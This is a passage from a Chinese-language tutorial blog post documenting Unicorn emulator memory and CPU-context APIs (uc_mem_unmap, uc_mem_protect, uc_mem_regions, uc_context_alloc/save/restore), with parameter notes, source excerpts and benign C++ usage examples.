要映射到的新内存区域的起始地址。这个地址必须与4KB对齐，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@size: 要映射到的新内存区域的大小。这个大小必须是4KB的倍数，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@perms: 新映射区域的权限。参数必须是UC_PROT_READ | UC_PROT_WRITE | UC_PROT_EXEC或这些的组合，否则返回UC_ERR_ARG错误。</span><br><span class="line">@ptr: 指向支持新映射内存的主机内存的指针。映射的主机内存的大小应该与size的大小相同或更大，并且至少使用PROT_READ | PROT_WRITE进行映射，否则不定义映射。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_map_ptr</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> size, <span class="keyword">uint32_t</span> perms, <span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_err res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;mem_redirect) &#123;</span><br><span class="line">        address = uc-&gt;mem_redirect(address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = mem_map_check(uc, address, size, perms);    <span class="comment">//内存安全检查</span></span><br><span class="line">    <span class="keyword">if</span> (res)</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mem_map(uc, address, size, UC_PROT_ALL, uc-&gt;memory_map_ptr(uc, address, size, perms, ptr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例同uc_mem_map</p><h3 id="uc-mem-unmap"><a href="#uc-mem-unmap" class="headerlink" title="uc_mem_unmap"></a>uc_mem_unmap</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_unmap</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure><p>取消对模拟内存区域的映射</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@address: 要映射到的新内存区域的起始地址。这个地址必须与4KB对齐，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@size: 要映射到的新内存区域的大小。这个大小必须是4KB的倍数，否则将返回UC_ERR_ARG错误。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_unmap</span><span class="params">(struct uc_struct *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line">    <span class="keyword">uint64_t</span> addr;</span><br><span class="line">    <span class="keyword">size_t</span> count, len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// 没有要取消映射的区域</span></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 地址必须对齐到 uc-&gt;target_page_size</span></span><br><span class="line">    <span class="keyword">if</span> ((address &amp; uc-&gt;target_page_align) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 大小必须是 uc-&gt;target_page_size 的倍数</span></span><br><span class="line">    <span class="keyword">if</span> ((size &amp; uc-&gt;target_page_align) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;mem_redirect) &#123;</span><br><span class="line">        address = uc-&gt;mem_redirect(address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查用户请求的整个块是否被映射</span></span><br><span class="line">    <span class="keyword">if</span> (!check_mem_area(uc, address, size))</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果这个区域跨越了相邻的区域，可能需要分割区域</span></span><br><span class="line">    addr = address;</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(count &lt; size) &#123;</span><br><span class="line">        mr = memory_mapping(uc, addr);</span><br><span class="line">        len = (<span class="keyword">size_t</span>)MIN(size - count, mr-&gt;end - addr);</span><br><span class="line">        <span class="keyword">if</span> (!split_region(uc, mr, addr, len, <span class="literal">true</span>))</span><br><span class="line">            <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 取消映射</span></span><br><span class="line">        mr = memory_mapping(uc, addr);</span><br><span class="line">        <span class="keyword">if</span> (mr != <span class="literal">NULL</span>)</span><br><span class="line">           uc-&gt;memory_unmap(uc, mr);</span><br><span class="line">        count += len;</span><br><span class="line">        addr += len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((err = uc_mem_map(uc, BASE, <span class="number">0x1000</span>, UC_PROT_ALL))) &#123;</span><br><span class="line">    uc_perror(<span class="string">"uc_mem_map"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((err = uc_mem_unmap(uc, BASE, <span class="number">0x1000</span>))) &#123;</span><br><span class="line">    uc_perror(<span class="string">"uc_mem_unmap"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="uc-mem-protect"><a href="#uc-mem-protect" class="headerlink" title="uc_mem_protect"></a>uc_mem_protect</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_protect</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> size, <span class="keyword">uint32_t</span> perms)</span></span>;</span><br></pre></td></tr></table></figure><p>设置模拟内存的权限</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@address: 要映射到的新内存区域的起始地址。这个地址必须与4KB对齐，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@size: 要映射到的新内存区域的大小。这个大小必须是4KB的倍数，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@perms: 映射区域的新权限。参数必须是UC_PROT_READ | UC_PROT_WRITE | UC_PROT_EXEC或这些的组合，否则返回UC_ERR_ARG错误。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_protect</span><span class="params">(struct uc_struct *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> size, <span class="keyword">uint32_t</span> perms)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line">    <span class="keyword">uint64_t</span> addr = address;</span><br><span class="line">    <span class="keyword">size_t</span> count, len;</span><br><span class="line">    <span class="keyword">bool</span> remove_exec = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// trivial case, no change</span></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// address must be aligned to uc-&gt;target_page_size</span></span><br><span class="line">    <span class="keyword">if</span> ((address &amp; uc-&gt;target_page_align) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// size must be multiple of uc-&gt;target_page_size</span></span><br><span class="line">    <span class="keyword">if</span> ((size &amp; uc-&gt;target_page_align) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check for only valid permissions</span></span><br><span class="line">    <span class="keyword">if</span> ((perms &amp; ~UC_PROT_ALL) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;mem_redirect) &#123;</span><br><span class="line">        address = uc-&gt;mem_redirect(address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check that user's entire requested block is mapped</span></span><br><span class="line">    <span class="keyword">if</span> (!check_mem_area(uc, address, size))</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now we know entire region is mapped, so change permissions</span></span><br><span class="line">    <span class="comment">// We may need to split regions if this area spans adjacent regions</span></span><br><span class="line">    addr = address;</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(count &lt; size) &#123;</span><br><span class="line">        mr = memory_mapping(uc, addr);</span><br><span class="line">        len = (<span class="keyword">size_t</span>)MIN(size - count, mr-&gt;end - addr);</span><br><span class="line">        <span class="keyword">if</span> (!split_region(uc, mr, addr, len, <span class="literal">false</span>))</span><br><span class="line">            <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line"></span><br><span class="line">        mr = memory_mapping(uc, addr);</span><br><span class="line">        <span class="comment">// will this remove EXEC permission?</span></span><br><span class="line">        <span class="keyword">if</span> (((mr-&gt;perms &amp; UC_PROT_EXEC) != <span class="number">0</span>) &amp;&amp; ((perms &amp; UC_PROT_EXEC) == <span class="number">0</span>))</span><br><span class="line">            remove_exec = <span class="literal">true</span>;</span><br><span class="line">        mr-&gt;perms = perms;</span><br><span class="line">        uc-&gt;readonly_mem(mr, (perms &amp; UC_PROT_WRITE) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        count += len;</span><br><span class="line">        addr += len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if EXEC permission is removed, then quit TB and continue at the same place</span></span><br><span class="line">    <span class="keyword">if</span> (remove_exec) &#123;</span><br><span class="line">        uc-&gt;quit_request = <span class="literal">true</span>;</span><br><span class="line">        uc_emu_stop(uc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((err = uc_mem_protect(uc, BASE, <span class="number">0x1000</span>, UC_PROT_ALL))) &#123;  <span class="comment">//可读可写可执行</span></span><br><span class="line">    uc_perror(<span class="string">"uc_mem_protect"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="uc-mem-regions"><a href="#uc-mem-regions" class="headerlink" title="uc_mem_regions"></a>uc_mem_regions</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_regions</span><span class="params">(uc_engine *uc, uc_mem_region **regions, <span class="keyword">uint32_t</span> *count)</span></span>;</span><br></pre></td></tr></table></figure><p>检索由 uc_mem_map() 和 uc_mem_map_ptr() 映射的内存的信息。</p><p>这个API为@regions分配内存，用户之后必须通过free()释放这些内存来避免内存泄漏。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@regions: 指向 uc_mem_region 结构体的数组的指针. 由Unicorn申请，必须通过uc_free()释放这些内存</span><br><span class="line">@count: 指向@regions中包含的uc_mem_region结构体的数量的指针</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码分析</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> uc_mem_regions(uc_engine *uc, uc_mem_region **regions, <span class="keyword">uint32_t</span> *count)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    uc_mem_region *r = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    *count = uc-&gt;mapped_block_count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*count) &#123;</span><br><span class="line">        r = g_malloc0(*count * <span class="keyword">sizeof</span>(uc_mem_region));</span><br><span class="line">        <span class="keyword">if</span> (r == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// 内存不足</span></span><br><span class="line">            <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; *count; i++) &#123;</span><br><span class="line">        r[i].begin = uc-&gt;mapped_blocks[i]-&gt;addr;</span><br><span class="line">        r[i].end = uc-&gt;mapped_blocks[i]-&gt;end - <span class="number">1</span>;</span><br><span class="line">        r[i].perms = uc-&gt;mapped_blocks[i]-&gt;perms;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *regions = r;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_err err;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_open(UC_ARCH_X86, UC_MODE_64, &amp;uc))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_open"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_mem_map(uc, BASE, <span class="number">0x1000</span>, UC_PROT_ALL))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_mem_map"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc_mem_region *region;</span><br><span class="line">    <span class="keyword">uint32_t</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_mem_regions(uc, &amp;region, &amp;count))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_mem_regions"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"起始地址： 0x"</span> &lt;&lt; hex &lt;&lt; region-&gt;begin &lt;&lt; <span class="string">"  结束地址： 0x"</span> &lt;&lt; hex &lt;&lt; region-&gt;end &lt;&lt; <span class="string">"  内存权限：  "</span> &lt;&lt;region-&gt;perms &lt;&lt; <span class="string">"  已申请内存块数： "</span> &lt;&lt; count &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span> ((err = uc_free(region))) &#123;    <span class="comment">////注意释放内存</span></span><br><span class="line">        uc_perror(<span class="string">"uc_free"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://i.loli.net/2020/01/20/kbrF7NdV6LDxnYI.png" alt="image.png"></p><h3 id="uc-free"><a href="#uc-free" class="headerlink" title="uc_free"></a>uc_free</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_free</span><span class="params">(<span class="keyword">void</span> *mem)</span></span>;</span><br></pre></td></tr></table></figure><p>释放由 uc_context_alloc 和 uc_mem_regions 申请的内存</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@mem: 由uc_context_alloc (返回 *context), 或由 uc_mem_regions (返回 *regions)申请的内存</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_free</span><span class="params">(<span class="keyword">void</span> *mem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_free(mem);</span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">g_free</span><span class="params">(gpointer ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例同uc_mem_regions</p><h3 id="uc-context-alloc"><a href="#uc-context-alloc" class="headerlink" title="uc_context_alloc"></a>uc_context_alloc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_context_alloc</span><span class="params">(uc_engine *uc, uc_context **context)</span></span>;</span><br></pre></td></tr></table></figure><p>分配一个可以与uc<em>context</em>{save,restore}一起使用的区域来执行CPU上下文的快速保存/回滚，包括寄存器和内部元数据。上下文不能在具有不同架构或模式的引擎实例之间共享。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@context: 指向uc_engine*的指针。当这个函数成功返回时，将使用指向新上下文的指针更新它。之后必须使用uc_free()释放这些分配的内存。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_context_alloc</span><span class="params">(uc_engine *uc, uc_context **context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uc_context</span> **_<span class="title">context</span> = <span class="title">context</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> size = cpu_context_size(uc-&gt;arch, uc-&gt;mode);</span><br><span class="line"></span><br><span class="line">    *_context = <span class="built_in">malloc</span>(size + <span class="keyword">sizeof</span>(uc_context));</span><br><span class="line">    <span class="keyword">if</span> (*_context) &#123;</span><br><span class="line">        (*_context)-&gt;size = size;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDRESS 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32_INC <span class="meta-string">"\x40"</span>   <span class="comment">// INC eax</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_context* context;</span><br><span class="line">    uc_err err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> r_eax = <span class="number">0x1</span>;    <span class="comment">// EAX 寄存器</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"===================================\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Save/restore CPU context in opaque blob\n"</span>);</span><br><span class="line"></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc_mem_map(uc, ADDRESS, <span class="number">8</span> * <span class="number">1024</span>, UC_PROT_ALL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc_mem_write(uc, ADDRESS, X86_CODE32_INC, <span class="keyword">sizeof</span>(X86_CODE32_INC) - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to write emulation code to memory, quit!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化寄存器</span></span><br><span class="line">    uc_reg_write(uc, UC_X86_REG_EAX, &amp;r_eax);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; Running emulation for the first time\n"</span>);</span><br><span class="line"></span><br><span class="line">    err = uc_emu_start(uc, ADDRESS, ADDRESS + <span class="keyword">sizeof</span>(X86_CODE32_INC) - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_emu_start() with error returned %u: %s\n"</span>,</span><br><span class="line">            err, uc_strerror(err));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; Emulation done. Below is the CPU context\n"</span>);</span><br><span class="line"></span><br><span class="line">    uc_reg_read(uc, UC_X86_REG_EAX, &amp;r_eax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; EAX = 0x%x\n"</span>, r_eax);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请并保存 CPU 上下文</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; Saving CPU context\n"</span>);</span><br><span class="line"></span><br><span class="line">    err = uc_context_alloc(uc, &amp;context);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_context_alloc() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = uc_context_save(uc, context);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_context_save() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; Running emulation for the second time\n"</span>);</span><br><span class="line"></span><br><span class="line">    err = uc_emu_start(uc, ADDRESS, ADDRESS + <span class="keyword">sizeof</span>(X86_CODE32_INC) - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_emu_start() with error returned %u: %s\n"</span>,</span><br><span class="line">            err, uc_strerror(err));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; Emulation done. Below is the CPU context\n"</span>);</span><br><span class="line"></span><br><span class="line">    uc_reg_read(uc, UC_X86_REG_EAX, &amp;r_eax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; EAX = 0x%x\n"</span>, r_eax);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复 CPU 上下文</span></span><br><span class="line">    err = uc_context_restore(uc, context);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_context_restore() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; CPU context restored. Below is the CPU context\n"</span>);</span><br><span class="line"></span><br><span class="line">    uc_reg_read(uc, UC_X86_REG_EAX, &amp;r_eax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; EAX = 0x%x\n"</span>, r_eax);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放 CPU 上下文</span></span><br><span class="line">    err = uc_free(context);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_free() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc_close(uc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://i.loli.net/2020/01/20/juNPWvwGUlraKRh.png" alt="image.png"></p><h3 id="uc-context-save"><a href="#uc-context-save" class="headerlink" title="uc_context_save"></a>uc_context_save</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_context_save</span><span class="params">(uc_engine *uc, uc_context *context)</span></span>;</span><br></pre></td></tr></table></figure><p>保存当前CPU上下文</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@context: uc_context_alloc() 返回的句柄</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_context_save</span><span class="params">(uc_engine *uc, uc_context *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uc_context</span> *_<span class="title">context</span> = <span class="title">context</span>;</span></span><br><span class="line">    <span class="built_in">memcpy</span>(_context-&gt;data, uc-&gt;cpu-&gt;env_ptr, _context-&gt;size);</span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例同uc_context_alloc()</p><h3 id="uc-context-restore"><a href="#uc-context-restore" class="headerlink" title="uc_context_restore"></a>uc_context_restore</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_context_restore</span><span class="params">(uc_engine *uc, uc_context *context)</span></span>;</span><br></pre></td></tr></table></figure><p>恢复已保存的CPU上下文</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@context: uc_context_alloc() 返回并且已使用 uc_context_save 保存的句柄</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_context_restore</span><span class="params">(uc_engine *uc, uc_context *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uc_context</span> *_<span class="title">context</span> = <span class="title">context</span>;</span></span><br><span class="line">    <span class="built_in">memcpy</span>(uc-&gt;cpu-&gt;env_ptr, _context-&gt;data, _context-&gt;size);</span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span 